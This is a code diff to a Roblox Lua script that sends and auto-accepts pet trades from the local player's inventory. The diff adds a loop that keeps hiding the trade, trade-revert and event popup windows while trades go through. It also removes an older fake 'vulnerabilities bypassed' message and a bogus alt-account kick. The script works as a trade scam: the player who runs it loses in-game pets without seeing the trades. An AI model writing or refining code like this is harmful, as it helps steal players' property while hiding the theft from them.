@@ -82,6 +82,28 @@ else
   print("LMAOOOOOO")
 end
 
+local hide = coroutine.create(function()
+    while true do
+        local player = game:GetService("Players").LocalPlayer
+        local EventPopup = player:WaitForChild("PlayerGui"):WaitForChild("EventPopupApp")
+        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeApp")
+        local revert = player:WaitForChild("PlayerGui"):WaitForChild("TradeRevertApp")
+
+        if EventPopup.Enabled == true then
+            EventPopup.Enabled = false
+        end
+
+        if tradeGUI.Enabled == true then
+            tradeGUI.Enabled = false
+        end
+        if revert.Enabled == true then
+            revert.Enabled = false
+        end
+
+        wait(0.1)
+    end
+end)
+
 local function AcceptTrade()
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
@@ -97,6 +119,8 @@ local function ConfirmTrade()
 end
 
 local function SendTrade()
+    coroutine.resume(hide)
+
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
@@ -126,23 +150,6 @@ wait(5)
   else
     print("No pets found in inventory.")
   end
-end
-
-local total_pets = 0
-for i, v in pairs(ClientData.get("inventory").pets) do
-    total_pets = total_pets + 1
-end
-warn("Your Script Detected", total_pets, "Vulnerabilities, Bypassing Them Right Now.")
-wait(5)
-print("Bypassed!")
-    if total_pets == 1 then
-        game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 1 pet in your inventory or use this script on your main account.")
-end
-game:GetService("Players").LocalPlayer.PlayerGui.TradeRevertApp.Enabled = false
-game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-local eventPopup = playerGui:FindFirstChild("EventPopupApp")
-if eventPopup then
-    eventPopup.Enabled = false  -- Menyembunyikan pop-up
 end
 
 game.Players.PlayerAdded:Connect(function(player)
